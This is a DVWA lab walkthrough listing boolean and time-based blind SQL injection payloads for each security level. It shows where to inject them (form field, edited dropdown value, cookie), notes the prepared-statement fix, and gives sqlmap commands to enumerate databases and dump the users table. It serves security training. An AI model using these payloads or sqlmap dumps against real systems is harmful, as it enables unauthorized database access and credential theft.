Low Security (Easy)

Boolean & Time-Based Inference

Where to type: Enter these payloads directly into the "User ID" text box on the DVWA page and click Submit. Look at whether it says "User ID exists" (TRUE) or "User ID is MISSING" (FALSE), or see if the page takes a long time to load.

Boolean-Based Testing

TRUE Condition: 1' AND 1=1# FALSE Condition: 1' AND 1=2#

Extract Database Name

1' AND SUBSTRING(database(),1,1)='d'# 1' AND SUBSTRING(database(),2,1)='v'# 1' AND SUBSTRING(database(),3,1)='w'# 1' AND SUBSTRING(database(),4,1)='a'#

ASCII Extraction

1' AND ASCII(SUBSTRING(database(),1,1))=100# 1' AND ASCII(SUBSTRING(database(),2,1))=118# 1' AND ASCII(SUBSTRING(database(),3,1))=119# 1' AND ASCII(SUBSTRING(database(),4,1))=97#

Time-Based Injection

1' AND SLEEP(5)#

Time-Based Character Extraction

1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)# 1' AND IF(SUBSTRING(database(),2,1)='v',SLEEP(5),0)#

Extract SQL Version & Tables

1' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)# 1' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)='u'# 1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1)='u'#

Medium Security

Numeric Boolean & Delay

Like standard SQLi, the input is numeric and single quotes are escaped.
Where to type: Right-click the dropdown, select "Inspect" (DevTools), and change the value="1" attribute of an option to the payload. Select that option and click Submit. Alternatively, intercept the request using Burp Suite and modify the id POST parameter.

Numeric Boolean Testing

1 AND 1=1 1 AND 1=2

Numeric Time Delay

1 AND SLEEP(5)

Extract Database Characters

1 AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0) 1 AND IF(SUBSTRING(database(),2,1)='v',SLEEP(5),0)

Version Enumeration

1 AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)

High Security

Cookie-Based / POST-Based Delay

The High level hides the vulnerability in the Cookie instead of a form field.
Where to type: Open DevTools (F12), go to the "Application" or "Storage" tab, click on Cookies on the left, find the id cookie, double-click its value, and paste your payload there. Then refresh the page to trigger the attack.

Delay Injection

1' AND SLEEP(5)-- - 1' AND SLEEP(10)-- -

ASCII & Time-Based Extraction

1' AND ASCII(SUBSTRING(database(),1,1))=100# 1' AND ASCII(SUBSTRING(database(),2,1))=118# 1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)# 1' AND IF(SUBSTRING(database(),2,1)='v',SLEEP(5),0)#

Impossible Security

How it is fixed

Payloads That Fail

1' AND 1=1# 1' AND SLEEP(5)# 1' UNION SELECT user,password FROM users#

Reason: The developer used Prepared Statements (Parameterized Queries) and proper Input Validation.

SQLMAP Commands

Automating Blind SQLi via Terminal

Where to type: Run these commands in your Kali Linux Terminal. Make sure to replace TARGET or localhost with your actual target IP, and replace YOURSESSION with your actual PHPSESSID cookie value.

Find Databases

sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" \ --cookie="PHPSESSID=YOURSESSION; security=low" \ --dbs

POST Injection (Medium Level)

sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" \ --data="id=1&Submit=Submit" \ --cookie="PHPSESSID=YOURSESSION; security=medium" \ -p id --dbs

List Tables & Dump Data

sqlmap -u "TARGET" -D dvwa --tables sqlmap -u "TARGET" -D dvwa -T users --dump

Faster Enumeration

sqlmap -u "TARGET" --batch --threads 5
